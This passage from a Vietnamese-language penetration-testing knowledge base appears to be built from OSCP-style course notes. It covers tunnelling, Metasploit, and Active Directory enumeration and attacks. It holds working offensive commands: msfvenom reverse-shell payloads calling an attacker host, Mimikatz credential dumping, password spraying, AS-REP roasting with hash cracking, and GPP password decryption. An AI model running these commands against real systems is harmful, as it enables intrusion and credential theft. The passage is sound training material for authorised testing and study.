    "title": "Port Forwarding with Windows Tools: Plink",
    "content": "`Plink.exe` (một phần của PuTTY) có thể được dùng để tạo SSH tunnel. Nó không hỗ trợ Remote Dynamic Port Forwarding, nhưng hỗ trợ Remote Port Forwarding (-R). Có thể cần `cmd.exe /c echo y | ...` để tự động chấp nhận host key.",
    "tags": [
      "pivoting",
      "port_forwarding",
      "ssh_tunneling",
      "windows",
      "plink",
      "remote_port_forwarding",
      "ssh_r",
      "tool"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "C:\\Windows\\Temp\\plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 <kali_ip>"
      },
      {
        "language": "bash",
        "command": "cmd.exe /c echo y | .\\plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 <kali_ip>"
      }
    ],
    "related_cves": [],
    "source_file": "14-Port Redirection and SSH Tunneling.md"
  },
  {
    "id": "portfwd_windows_netsh",
    "category": "Port Redirection and SSH Tunneling",
    "title": "Port Forwarding with Windows Tools: Netsh",
    "content": "`netsh` là công cụ Windows tích hợp sẵn, yêu cầu quyền quản trị (administrative privileges) để tạo port forwarding. Sử dụng `netsh interface portproxy add v4tov4 ...` để định nghĩa quy tắc chuyển tiếp. Cần phải mở cổng lắng nghe trên Windows Firewall (`netsh advfirewall firewall add rule ...`) để cho phép kết nối từ bên ngoài.",
    "tags": [
      "pivoting",
      "port_forwarding",
      "windows",
      "netsh",
      "administrator",
      "portproxy",
      "firewall"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "netsh interface portproxy add v4tov4 listenport=2222 listenaddress=<target_ip_pivot> connectport=22 connectaddress=<target_ip_internal_ssh>"
      },
      {
        "language": "bash",
        "command": "netsh interface portproxy show all"
      },
      {
        "language": "bash",
        "command": "netsh advfirewall firewall add rule name=\"port_forward_ssh_2222\" protocol=TCP dir=in localip=<target_ip_pivot> localport=2222 action=allow"
      }
    ],
    "related_cves": [],
    "source_file": "14-Port Redirection and SSH Tunneling.md"
  },
  {
    "id": "http_tunneling_chisel",
    "category": "Port Redirection and SSH Tunneling",
    "title": "HTTP Tunneling with Chisel",
    "content": "Chisel là công cụ tạo tunnel qua HTTP. Kịch bản: Chạy `chisel server` trên Kali (với cờ `--reverse`). Chạy `chisel client` trên máy trung gian, kết nối đến server Kali và chỉ định tạo SOCKS proxy (`R:socks`). Máy chủ sẽ đóng gói lưu lượng SOCKS qua HTTP (đã mã hóa SSH) và gửi đến client. Cần đảm bảo phiên bản chisel tương thích giữa client và server (ví dụ: downgrade nếu gặp lỗi GLIBC).",
    "tags": [
      "pivoting",
      "http_tunneling",
      "chisel",
      "tool",
      "socks_proxy",
      "reverse_tunnel",
      "glibc"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "chisel server -p 8080 --reverse"
      },
      {
        "language": "bash",
        "command": "/tmp/chisel client <kali_ip>:8080 R:socks > /dev/null 2>&1 &"
      },
      {
        "language": "bash",
        "command": "ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@<target_ip_internal_db>"
      }
    ],
    "related_cves": [],
    "source_file": "14-Port Redirection and SSH Tunneling.md"
  },
  {
    "id": "dns_tunneling_dnscat2",
    "category": "Port Redirection and SSH Tunneling",
    "title": "DNS Tunneling with dnscat2",
    "content": "Sử dụng DNS tunneling để tạo kênh điều khiển. Chạy `dnscat2-server` trên một máy (FELINEAUTHORITY) và `dnscat2-client` trên máy nạn nhân (PGDATABASE01) để thiết lập phiên. Sau khi kết nối, có thể sử dụng các lệnh tích hợp như `listen` để tạo port forwarding qua DNS tunnel.",
    "tags": [
      "pivoting",
      "dns_tunneling",
      "dnscat2",
      "tool",
      "port_forwarding"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "dnscat2-server <target_domain>"
      },
      {
        "language": "bash",
        "command": "dnscat2-client <target_domain>"
      },
      {
        "language": "bash",
        "command": "listen 0.0.0.0:6464 <target_ip_internal>:4646"
      }
    ],
    "related_cves": [],
    "source_file": "14-Port Redirection and SSH Tunneling.md"
  },
  {
    "id": "metasploit_setup",
    "category": "Metasploit Framework",
    "title": "Getting Familiar with Metasploit: Setup and Work",
    "content": "Khởi tạo cơ sở dữ liệu cho Metasploit (MSF) bằng `sudo msfdb init`. Đảm bảo dịch vụ `postgresql` được bật. Khởi động `msfconsole`. Kiểm tra trạng thái DB bằng `db_status`. Sử dụng `workspace -a <name>` để tạo không gian làm việc. `show -h` để xem các mô-đun. `use <module>` để chọn mô-đun.",
    "tags": [
      "metasploit",
      "msfconsole",
      "setup",
      "msfdb",
      "postgresql",
      "workspace"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "sudo msfdb init"
      },
      {
        "language": "bash",
        "command": "sudo systemctl enable postgresql"
      },
      {
        "language": "bash",
        "command": "msfconsole"
      },
      {
        "language": "bash",
        "command": "workspace -a pen200"
      }
    ],
    "related_cves": [],
    "source_file": "15-Metasploit Framework.md"
  },
  {
    "id": "metasploit_auxiliary_modules",
    "category": "Metasploit Framework",
    "title": "Metasploit: Auxiliary Modules",
    "content": "Mô-đun Auxiliary dùng để thu thập thông tin. Sử dụng `search type:auxiliary <keyword>` để tìm mô-đun. Ví dụ: `auxiliary/scanner/smb/smb_version` (quét phiên bản SMB) hoặc `auxiliary/scanner/ssh/ssh_login` (brute-force SSH, tương tự Hydra). Sau khi chạy, có thể dùng `creds` để xem các thông tin đăng nhập đã tìm thấy.",
    "tags": [
      "metasploit",
      "msfconsole",
      "auxiliary_module",
      "scanner",
      "ssh_login",
      "smb_version",
      "creds"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "search type:auxiliary smb"
      },
      {
        "language": "bash",
        "command": "use auxiliary/scanner/ssh/ssh_login"
      },
      {
        "language": "bash",
        "command": "set RHOSTS <target_ip>"
      },
      {
        "language": "bash",
        "command": "run"
      },
      {
        "language": "bash",
        "command": "creds"
      }
    ],
    "related_cves": [],
    "source_file": "15-Metasploit Framework.md"
  },
  {
    "id": "metasploit_exploit_modules",
    "category": "Metasploit Framework",
    "title": "Metasploit: Exploit Modules and Sessions",
    "content": "Mô-đun Exploit dùng để khai thác lỗ hổng. Sử dụng `search <keyword>` để tìm exploit (ví dụ: `search Apache 2.4.49`). Sau khi khai thác thành công, một phiên (session) sẽ được tạo. Dùng `sessions -l` để liệt kê các phiên, `Ctrl + Z` để tạm dừng phiên hiện tại, và `sessions -i <id>` để tương tác lại với phiên đó.",
    "tags": [
      "metasploit",
      "msfconsole",
      "exploit_module",
      "search",
      "sessions"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "search type:exploit Apache 2.4.49"
      },
      {
        "language": "bash",
        "command": "set payload linux/x64/shell_reverse_tcp"
      },
      {
        "language": "bash",
        "command": "run"
      },
      {
        "language": "bash",
        "command": "sessions -l"
      },
      {
        "language": "bash",
        "command": "sessions -i 1"
      }
    ],
    "related_cves": [],
    "source_file": "15-Metasploit Framework.md"
  },
  {
    "id": "metasploit_payloads_staged_vs_nonstaged",
    "category": "Metasploit Framework",
    "title": "Metasploit Payloads: Staged vs Non-Staged",
    "content": "Payload non-staged được gửi toàn bộ cùng lúc (kích thước lớn hơn). Payload staged được gửi thành nhiều phần (kích thước nhỏ hơn, thường dùng để né AV). Dấu hiệu nhận biết là dấu `/` trong tên payload. Staged: `shell/reverse_tcp`. Non-staged: `shell_reverse_tcp`.",
    "tags": [
      "theory",
      "metasploit",
      "payloads",
      "staged_payload",
      "non_staged_payload",
      "av_evasion"
    ],
    "code_snippets": [],
    "related_cves": [],
    "source_file": "15-Metasploit Framework.md"
  },
  {
    "id": "metasploit_meterpreter",
    "category": "Metasploit Framework",
    "title": "Metasploit Payloads: Meterpreter",
    "content": "Meterpreter là một payload mạnh mẽ cho phép tương tác thời gian thực với hệ thống mục tiêu. Ưu tiên sử dụng payload Meterpreter non-staged (ví dụ: `payload/linux/x64/meterpreter_reverse_https`).",
    "tags": [
      "metasploit",
      "payloads",
      "meterpreter",
      "non_staged_payload"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "set payload payload/linux/x64/meterpreter_reverse_https"
      }
    ],
    "related_cves": [],
    "source_file": "15-Metasploit Framework.md"
  },
  {
    "id": "metasploit_msfvenom_handler",
    "category": "Metasploit Framework",
    "title": "Metasploit Payloads: Executable (msfvenom)",
    "content": "Sử dụng `msfvenom` để tạo các tệp payload độc lập (ví dụ: .exe, .php). Cần thiết lập một trình nghe (listener) trong `msfconsole` bằng `multi/handler` để bắt kết nối khi payload được thực thi trên máy nạn nhân. Cần đảm bảo `payload` trong `multi/handler` khớp với payload đã tạo bằng `msfvenom`.",
    "tags": [
      "metasploit",
      "payloads",
      "msfvenom",
      "multi_handler",
      "executable_payload",
      "php",
      "exe"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<kali_ip> LPORT=4444 -f exe -o shell.exe"
      },
      {
        "language": "bash",
        "command": "msfvenom -p php/meterpreter/reverse_tcp LHOST=<kali_ip> LPORT=4444 -f raw > shell.php"
      },
      {
        "language": "bash",
        "command": "use multi/handler"
      },
      {
        "language": "bash",
        "command": "set payload php/meterpreter/reverse_tcp"
      },
      {
        "language": "bash",
        "command": "run"
      }
    ],
    "related_cves": [],
    "source_file": "15-Metasploit Framework.md"
  },
  {
    "id": "metasploit_post_exploitation_core",
    "category": "Metasploit Framework",
    "title": "Post-Exploitation: Core Meterpreter Features",
    "content": "Các tính năng post-exploitation cơ bản của Meterpreter bao gồm `idletime` (hiển thị thời gian rảnh của user) và `migrate` (di chuyển tiến trình Meterpreter sang một tiến trình khác, thường dùng trên Windows để lẩn tránh).",
    "tags": [
      "metasploit",
      "meterpreter",
      "post_exploitation",
      "idletime",
      "migrate",
      "windows"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "migrate 5976"
      }
    ],
    "related_cves": [],
    "source_file": "15-Metasploit Framework.md"
  },
  {
    "id": "metasploit_post_exploitation_lab_getsystem_migrate",
    "category": "Metasploit Framework",
    "title": "LAB: Post-Exploitation (getsystem, migrate)",
    "content": "Nâng cấp từ bind shell lên Meterpreter (dùng `msfvenom` tạo .exe, tải lên và chạy). Trên session Meterpreter, kiểm tra `whoami /priv`, nếu có `SeImpersonatePrivilege` thì chạy `getsystem` để leo thang lên SYSTEM. Chạy `ps` để xem tiến trình, sau đó `migrate` sang một tiến trình của người dùng khác (ví dụ: `OneDrive.exe` của user `offsec`) để chiếm quyền của người dùng đó (`getuid` -> `offsec`).",
    "tags": [
      "lab",
      "metasploit",
      "meterpreter",
      "post_exploitation",
      "privesc",
      "getsystem",
      "seimpersonateprivilege",
      "migrate",
      "ps"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "msfvenom -p windows/x64/meterpreter_reverse_https LHOST=<kali_ip> LPORT=443 -f exe -o met.exe"
      },
      {
        "language": "bash",
        "command": "getuid"
      },
      {
        "language": "bash",
        "command": "getsystem"
      },
      {
        "language": "bash",
        "command": "migrate 5976"
      }
    ],
    "related_cves": [],
    "source_file": "15-Metasploit Framework.md"
  },
  {
    "id": "metasploit_post_exploitation_modules",
    "category": "Metasploit Framework",
    "title": "Post-Exploitation: Post-Exploitation Modules",
    "content": "Metasploit cung cấp các mô-đun post-exploitation chuyên dụng (trong thư mục `post/`). Ví dụ: `post/windows/gather/enum_hostfile` có thể được sử dụng để tự động trích xuất tệp hosts của Windows. Cần `set SESSION` để chỉ định phiên Meterpreter nào sẽ chạy mô-đun.",
    "tags": [
      "metasploit",
      "meterpreter",
      "post_exploitation",
      "post_module"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "use post/windows/gather/enum_hostfile"
      },
      {
        "language": "bash",
        "command": "set SESSION 2"
      },
      {
        "language": "bash",
        "command": "run"
      }
    ],
    "related_cves": [],
    "source_file": "15-Metasploit Framework.md"
  },
  {
    "id": "metasploit_pivoting",
    "category": "Metasploit Framework",
    "title": "Post-Exploitation: Pivoting with Metasploit",
    "content": "Metasploit hỗ trợ pivoting (xoay trục) để truy cập các mạng nội bộ. Có thể dùng mô-đun `auxiliary/server/socks_proxy` để tạo SOCKS proxy, hoặc dùng lệnh `portfwd` trực tiếp trong session Meterpreter để chuyển tiếp cổng. `autoroute` (`multi/manage/autoroute`) được dùng để thêm các tuyến đường (route) vào bảng định tuyến của Metasploit, cho phép các mô-đun khác truy cập vào mạng con đích.",
    "tags": [
      "metasploit",
      "meterpreter",
      "post_exploitation",
      "pivoting",
      "socks_proxy",
      "portfwd",
      "autoroute"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "use auxiliary/server/socks_proxy"
      },
      {
        "language": "bash",
        "command": "portfwd add -l 3389 -p 3389 -r <target_ip_internal>"
      },
      {
        "language": "bash",
        "command": "use multi/manage/autoroute"
      },
      {
        "language": "bash",
        "command": "set SESSION 1"
      },
      {
        "language": "bash",
        "command": "run"
      }
    ],
    "related_cves": [],
    "source_file": "15-Metasploit Framework.md"
  },
  {
    "id": "metasploit_automation_resource_scripts",
    "category": "Metasploit Framework",
    "title": "Automating Metasploit: Resource Scripts",
    "content": "Sử dụng các tệp kịch bản tài nguyên (resource scripts - .rc) để tự động hóa Metasploit. Tạo một tệp `exploit.rc` chứa các lệnh `msfconsole` và chạy bằng `msfconsole -r exploit.rc`. Các kịch bản có sẵn nằm trong `/usr/share/metasploit-framework/scripts/resource`.",
    "tags": [
      "metasploit",
      "automation",
      "resource_script",
      "rc_script"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "nano exploit.rc"
      },
      {
        "language": "bash",
        "command": "msfconsole -r exploit.rc"
      }
    ],
    "related_cves": [],
    "source_file": "15-Metasploit Framework.md"
  },
  {
    "id": "ad_intro",
    "category": "AD Introduction and Enumeration",
    "title": "Active Directory - Introduction",
    "content": "Active Directory (AD) lưu trữ thông tin về các đối tượng như users, groups, và computers. Quyền (Permissions) trên các đối tượng này quyết định đặc quyền trong domain. `Domain Admins` là một trong những nhóm có đặc quyền cao nhất. Một AD có thể chứa nhiều domain (domain tree) hoặc nhiều domain tree (domain forest).",
    "tags": [
      "theory",
      "active_directory",
      "ad",
      "objects",
      "permissions",
      "domain_admins",
      "domain_tree",
      "domain_forest"
    ],
    "code_snippets": [],
    "related_cves": [],
    "source_file": "16-AD Introduction and Enumeration.md"
  },
  {
    "id": "ad_enum_manual_legacy_net",
    "category": "AD Introduction and Enumeration",
    "title": "AD Manual Enumeration: Legacy Windows Tools (net.exe)",
    "content": "Nên sử dụng RDP để kết nối với máy AD để tránh sự cố Kerberos Double Hop. Sử dụng công cụ `net.exe` để liệt kê thông tin domain. `net user /domain` (liệt kê người dùng), `net user <username> /domain` (thông tin chi tiết người dùng), `net group /domain` (liệt kê nhóm), `net group \"<groupname>\" /domain` (liệt kê thành viên nhóm).",
    "tags": [
      "active_directory",
      "ad",
      "enumeration",
      "manual_enum",
      "net.exe",
      "net_user",
      "net_group",
      "rdp",
      "kerberos_double_hop"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "net user /domain"
      },
      {
        "language": "bash",
        "command": "net user jeffadmin /domain"
      },
      {
        "language": "bash",
        "command": "net group /domain"
      },
      {
        "language": "bash",
        "command": "net group \"Sales Department\" /domain"
      }
    ],
    "related_cves": [],
    "source_file": "16-AD Introduction and Enumeration.md"
  },
  {
    "id": "ad_enum_manual_ldap_dotnet",
    "category": "AD Introduction and Enumeration",
    "title": "AD Manual Enumeration: PowerShell and .NET (LDAP)",
    "content": "LDAP là giao thức dùng để giao tiếp với AD. Cần xác định Primary Domain Controller (PDC) (máy giữ `PdcRoleOwner` property) và Distinguished Name (DN) (ví dụ: `CN=Stephanie,CN=Users,DC=corp,DC=com`) để xây dựng đường dẫn LDAP (ví dụ: `LDAP://HostName[:PortNumber][/DistinguishedName]`).",
    "tags": [
      "theory",
      "active_directory",
      "ad",
      "enumeration",
      "manual_enum",
      "ldap",
      "powershell",
      "dotnet",
      "pdc",
      "distinguished_name",
      "dn",
      "cn",
      "dc"
    ],
    "code_snippets": [
      {
        "language": "powershell",
        "command": "[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()"
      },
      {
        "language": "powershell",
        "command": "([adsi]'').distinguishedName"
      }
    ],
    "related_cves": [],
    "source_file": "16-AD Introduction and Enumeration.md"
  },
  {
    "id": "ad_enum_manual_dotnet_searcher",
    "category": "AD Introduction and Enumeration",
    "title": "AD Manual Enumeration: .NET DirectorySearcher",
    "content": "Sử dụng các lớp .NET `System.DirectoryServices.DirectorySearcher` và `DirectoryEntry` trong PowerShell để truy vấn LDAP. Có thể tạo hàm (ví dụ `LDAPSearch`) để tìm kiếm với các bộ lọc (filter) LDAP cụ thể. Ví dụ filter: `(samAccountType=805306368)` (tìm tất cả user), `(objectclass=group)` (tìm tất cả group), hoặc `(&(objectCategory=group)(cn=Service Personnel))` (tìm nhóm theo tên).",
    "tags": [
      "active_directory",
      "ad",
      "enumeration",
      "manual_enum",
      "powershell",
      "dotnet",
      "directorysearcher",
      "directoryentry",
      "ldap",
      "ldap_filter"
    ],
    "code_snippets": [
      {
        "language": "powershell",
        "command": "$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)"
      },
      {
        "language": "powershell",
        "command": "$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)"
      },
      {
        "language": "powershell",
        "command": "$dirsearcher.filter=\"samAccountType=805306368\""
      },
      {
        "language": "powershell",
        "command": "LDAPSearch -LDAPQuery \"(samAccountType=805306368)\""
      },
      {
        "language": "powershell",
        "command": "LDAPSearch -LDAPQuery \"(&(objectCategory=group)(cn=Service Personnel))\""
      }
    ],
    "related_cves": [],
    "source_file": "16-AD Introduction and Enumeration.md"
  },
  {
    "id": "ad_enum_automated_powerview",
    "category": "AD Introduction and Enumeration",
    "title": "AD Enumeration with PowerView",
    "content": "`PowerView.ps1` là một công cụ PowerShell mạnh mẽ để liệt kê AD. Sau khi `Import-Module`, có thể sử dụng các lệnh cmdlet như `Get-NetUser` (liệt kê người dùng), `Get-NetGroup` (liệt kê nhóm), `Get-NetGroup \"<groupname>\" | select member` (xem thành viên nhóm).",
    "tags": [
      "active_directory",
      "ad",
      "enumeration",
      "automated_enum",
      "powerview",
      "powershell",
      "tool",
      "get-netuser",
      "get-netgroup"
    ],
    "code_snippets": [
      {
        "language": "powershell",
        "command": "Import-Module .\\PowerView.ps1"
      },
      {
        "language": "powershell",
        "command": "Get-NetUser | select cn,pwdlastset,lastlogon"
      },
      {
        "language": "powershell",
        "command": "Get-NetGroup \"Sales Department\" | select member"
      }
    ],
    "related_cves": [],
    "source_file": "16-AD Introduction and Enumeration.md"
  },
  {
    "id": "ad_enum_powerview_computers",
    "category": "AD Introduction and Enumeration",
    "title": "AD Enumeration (PowerView): Operating System",
    "content": "Sử dụng `Get-NetComputer` của PowerView để liệt kê thông tin máy tính trong domain, bao gồm `operatingsystem` và `dnshostname`.",
    "tags": [
      "active_directory",
      "ad",
      "enumeration",
      "powerview",
      "get-netcomputer",
      "operatingsystem"
    ],
    "code_snippets": [
      {
        "language": "powershell",
        "command": "Get-NetComputer | select operatingsystem,dnshostname"
      }
    ],
    "related_cves": [],
    "source_file": "16-AD Introduction and Enumeration.md"
  },
  {
    "id": "ad_enum_powerview_loggedon",
    "category": "AD Introduction and Enumeration",
    "title": "AD Enumeration (PowerView): Permissions and Logged on Users",
    "content": "`Chained compromise` là quá trình cải thiện quyền truy cập qua nhiều tài khoản. Dùng `Find-LocalAdminAccess` của PowerView để xem các máy tính mà người dùng hiện tại có quyền admin local. `Get-NetSession -ComputerName <host>` (yêu cầu quyền cao) hoặc `PsLoggedon.exe` (yêu cầu Remote Registry) có thể dùng để xem ai đang đăng nhập vào máy tính đó.",
    "tags": [
      "active_directory",
      "ad",
      "enumeration",
      "powerview",
      "psloggedon",
      "find-localadminaccess",
      "get-netsession",
      "chained_compromise",
      "local_admin"
    ],
    "code_snippets": [
      {
        "language": "powershell",
        "command": "Find-LocalAdminAccess"
      },
      {
        "language": "powershell",
        "command": "Get-NetSession -ComputerName files04 -Verbose"
      },
      {
        "language": "powershell",
        "command": ".\\PsLoggedon.exe \\\\files04"
      }
    ],
    "related_cves": [],
    "source_file": "16-AD Introduction and Enumeration.md"
  },
  {
    "id": "ad_enum_spn",
    "category": "AD Introduction and Enumeration",
    "title": "AD Enumeration: Service Principal Names (SPN)",
    "content": "SPN (Service Principal Name) là một định danh duy nhất cho một phiên bản dịch vụ. Có thể liệt kê SPN bằng `setspn.exe -L <user>` (công cụ Windows) hoặc `Get-NetUser -SPN` (PowerView).",
    "tags": [
      "active_directory",
      "ad",
      "enumeration",
      "spn",
      "service_principal_name",
      "setspn",
      "powerview",
      "get-netuser"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "setspn -L iis_service"
      },
      {
        "language": "powershell",
        "command": "Get-NetUser -SPN | select samaccountname,serviceprincipalname"
      }
    ],
    "related_cves": [],
    "source_file": "16-AD Introduction and Enumeration.md"
  },
  {
    "id": "ad_enum_object_permissions_acl",
    "category": "AD Introduction and Enumeration",
    "title": "AD Enumeration: Object Permissions (ACL)",
    "content": "ACL (Access Control List) là danh sách các ACE (Access Control Entry), tức là các quyền (permissions) áp dụng cho đối tượng. Kẻ tấn công tìm cách lạm dụng các quyền như `GenericAll` (full control), `GenericWrite` (sửa thuộc tính), `WriteOwner` (đổi chủ sở hữu), `WriteDACL` (sửa ACE), `AllExtendedRights`, `ForceChangePassword`, `Self (Self-Membership)` (tự thêm vào nhóm). Sử dụng `Get-ObjectAcl` của PowerView để kiểm tra.",
    "tags": [
      "theory",
      "active_directory",
      "ad",
      "enumeration",
      "acl",
      "ace",
      "permissions",
      "powerview",
      "get-objectacl",
      "genericall",
      "writedacl"
    ],
    "code_snippets": [
      {
        "language": "powershell",
        "command": "Get-ObjectAcl -Identity stephanie"
      },
      {
        "language": "powershell",
        "command": "Get-ObjectAcl -Identity \"Management Department\" | ? {$_.ActiveDirectoryRights -eq \"GenericAll\"} | select SecurityIdentifier,ActiveDirectoryRights"
      }
    ],
    "related_cves": [],
    "source_file": "16-AD Introduction and Enumeration.md"
  },
  {
    "id": "ad_enum_domain_shares_gpp",
    "category": "AD Introduction and Enumeration",
    "title": "AD Enumeration: Domain Shares (GPP)",
    "content": "Domain shares thường chứa thông tin quan trọng. Sử dụng `Find-DomainShare -CheckShareAccess` của PowerView để tìm các share có thể truy cập. Share `SYSVOL` (trong `Policies`) có thể chứa mật khẩu hash (đã mã hóa) của Administrator local, do quản trị viên đặt qua Group Policy Preferences (GPP). Có thể dùng `gpp-decrypt.py` trên Kali để giải mã hash này.",
    "tags": [
      "active_directory",
      "ad",
      "enumeration",
      "domain_shares",
      "powerview",
      "find-domainshare",
      "sysvol",
      "gpp",
      "group_policy_preferences",
      "gpp-decrypt"
    ],
    "code_snippets": [
      {
        "language": "powershell",
        "command": "Find-DomainShare -CheckShareAccess"
      },
      {
        "language": "powershell",
        "command": "ls \\\\<target_ip_dc>\\sysvol\\<target_domain>\\Policies\\"
      },
      {
        "language": "bash",
        "command": "gpp-decrypt \"+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE\""
      }
    ],
    "related_cves": [],
    "source_file": "16-AD Introduction and Enumeration.md"
  },
  {
    "id": "ad_enum_automated_sharphound_bloodhound",
    "category": "AD Introduction and Enumeration",
    "title": "AD Automated Enumeration: SharpHound and BloodHound",
    "content": "`SharpHound.exe` (chạy qua script `SharpHound.ps1`) là công cụ thu thập dữ liệu từ domain và xuất ra file JSON (`Invoke-BloodHound -CollectionMethod All ...`). `BloodHound` (chạy trên Kali) là công cụ trực quan hóa dữ liệu JSON này. Cần khởi động `neo4j` (cơ sở dữ liệu) trước, sau đó chạy `bloodhound`, đăng nhập và import tệp zip từ SharpHound.",
    "tags": [
      "active_directory",
      "ad",
      "enumeration",
      "automated_enum",
      "sharphound",
      "bloodhound",
      "neo4j",
      "invoke-bloodhound",
      "visualization",
      "tool"
    ],
    "code_snippets": [
      {
        "language": "powershell",
        "command": "Import-Module .\\SharpHound.ps1"
      },
      {
        "language": "powershell",
        "command": "Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\\Users\\stephanie\\Desktop\\ -OutputPrefix \"corp_audit\""
      },
      {
        "language": "bash",
        "command": "sudo neo4j start"
      },
      {
        "language": "bash",
        "command": "bloodhound"
      }
    ],
    "related_cves": [],
    "source_file": "16-AD Introduction and Enumeration.md"
  },
  {
    "id": "ad_auth_ntlm",
    "category": "Attacking AD Authentication",
    "title": "Understanding AD Authentication: NTLM",
    "content": "NTLM là một giao thức xác thực dạng thách thức-phản hồi (challenge-response) được client sử dụng để xác thực với một máy chủ ứng dụng (application server).",
    "tags": [
      "theory",
      "active_directory",
      "ad",
      "authentication",
      "ntlm",
      "challenge_response"
    ],
    "code_snippets": [],
    "related_cves": [],
    "source_file": "17-Attacking AD Authentication.md"
  },
  {
    "id": "ad_auth_kerberos",
    "category": "Attacking AD Authentication",
    "title": "Understanding AD Authentication: Kerberos",
    "content": "Kerberos là một giao thức xác thực dựa trên vé (ticket-based) được client sử dụng để xác thực với một domain controller.",
    "tags": [
      "theory",
      "active_directory",
      "ad",
      "authentication",
      "kerberos",
      "ticket_based"
    ],
    "code_snippets": [],
    "related_cves": [],
    "source_file": "17-Attacking AD Authentication.md"
  },
  {
    "id": "ad_auth_cached_creds_mimikatz",
    "category": "Attacking AD Authentication",
    "title": "Understanding AD Authentication: Cached Credentials (Mimikatz)",
    "content": "Cached Credentials (Thông tin đăng nhập được lưu đệm) là một cách để lưu trữ thông tin đăng nhập của người dùng trong tiến trình LSASS. Sử dụng Mimikatz để trích xuất các thông tin này, bao gồm cả mật khẩu đã cache (`sekurlsa::logonpasswords`) và các vé Kerberos (`sekurlsa::tickets`).",
    "tags": [
      "active_directory",
      "ad",
      "authentication",
      "mimikatz",
      "lsass",
      "cached_credentials",
      "sekurlsa_logonpasswords",
      "sekurlsa_tickets",
      "credential_dumping"
    ],
    "code_snippets": [
      {
        "language": "powershell",
        "command": "privilege::debug"
      },
      {
        "language": "powershell",
        "command": "sekurlsa::logonpasswords"
      },
      {
        "language": "powershell",
        "command": "sekurlsa::tickets"
      }
    ],
    "related_cves": [],
    "source_file": "17-Attacking AD Authentication.md"
  },
  {
    "id": "ad_attack_password_spraying",
    "category": "Attacking AD Authentication",
    "title": "Password Attacks: Password Spraying",
    "content": "Trước khi tấn công, kiểm tra chính sách khóa tài khoản (`net accounts /domain`). Password spraying là một kiểu tấn công chậm và thấp (low and slow). Có thể thực hiện qua LDAP/ADSI (ví dụ: `Spray-Passwords.ps1`), qua SMB (dùng `crackmapexec`), hoặc qua Kerberos (dùng `kerbrute`).",
    "tags": [
      "active_directory",
      "ad",
      "attack",
      "password_spraying",
      "ldap",
      "smb",
      "kerberos",
      "crackmapexec",
      "kerbrute",
      "net_accounts"
    ],
    "code_snippets": [
      {
        "language": "powershell",
        "command": ".\\Spray-Passwords.ps1 -Pass Nexus123! -Admin"
      },
      {
        "language": "bash",
        "command": "crackmapexec smb <target_ip> -u users.txt -p 'Nexus123!' -d <target_domain> --continue-on-success"
      },
      {
        "language": "powershell",
        "command": ".\\kerbrute_windows_amd64.exe passwordspray -d <target_domain> .\\usernames.txt \"Nexus123!\""
      }
    ],
    "related_cves": [],
    "source_file": "17-Attacking AD Authentication.md"
  },
  {
    "id": "ad_attack_asrep_roasting",
    "category": "Attacking AD Authentication",
    "title": "Attacking AD Authentication: AS-REP Roasting",
    "content": "AS-REP Roasting là một phương thức tấn công nhắm vào các tài khoản người dùng AD có bật tùy chọn 'Do not require Kerberos preauthentication'. Kẻ tấn công có thể yêu cầu một vé AS (Bước 2 của Kerberos) và bẻ khóa nó offline. Có thể dùng `impacket-GetNPUsers` (Kali) hoặc `Rubeus` (Windows) để lấy hash. Dùng PowerView (`Get-DomainUser -PreauthNotRequired`) để tìm các tài khoản này. Có thể bật cờ này nếu có quyền `GenericWrite` hoặc `GenericAll` trên tài khoản.",
    "tags": [
      "active_directory",
      "ad",
      "attack",
      "asrep_roasting",
      "kerberos",
      "preauthentication",
      "impacket-getnpusers",
      "rubeus",
      "hashcat",
      "mode_18200",
      "powerview"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "impacket-GetNPUsers -dc-ip <target_ip>  -request -outputfile hashes.asreproast <target_domain>/pete"
      },
      {
        "language": "bash",
        "command": "sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt"
      },
      {
        "language": "powershell",
        "command": ".\\Rubeus.exe asreproast /nowrap"
      }
    ],
    "related_cves": [],
    "source_file": "17-Attacking AD Authentication.md"
  },
  {
    "id": "ad_attack_kerberoasting",
    "category": "Attacking AD Authentication",
    "title": "Attacking AD Authentication: Kerberoasting",
    "content": "Kerberoasting là một phương thức tấn công nhắm vào các tài khoản dịch vụ có SPN. Kẻ tấn công yêu cầu một vé dịch vụ (TGS, Bước 3-4 Kerberos) từ Domain Controller. DC không kiểm tra quyền truy cập và trả về một vé được mã hóa bằng hash NTLM của tài khoản dịch vụ. Kẻ tấn công có thể bẻ khóa vé này offline. Dùng `impacket-GetUserSPNs` (Kali) hoặc `Rubeus` (Windows) để lấy hash vé. Dùng `hashcat -m 13100` để bẻ khóa. Nếu có quyền `GenericWrite` hoặc `GenericAll`, có thể tự set SPN cho user để tấn công.",
    "tags": [
      "active_directory",
      "ad",
      "attack",
      "kerberoasting",
      "kerberos",
      "spn",
      "tgs",
      "impacket-getuserspns",
      "rubeus",
      "hashcat",
      "mode_13100"
    ],
    "code_snippets": [
      {
        "language": "bash",
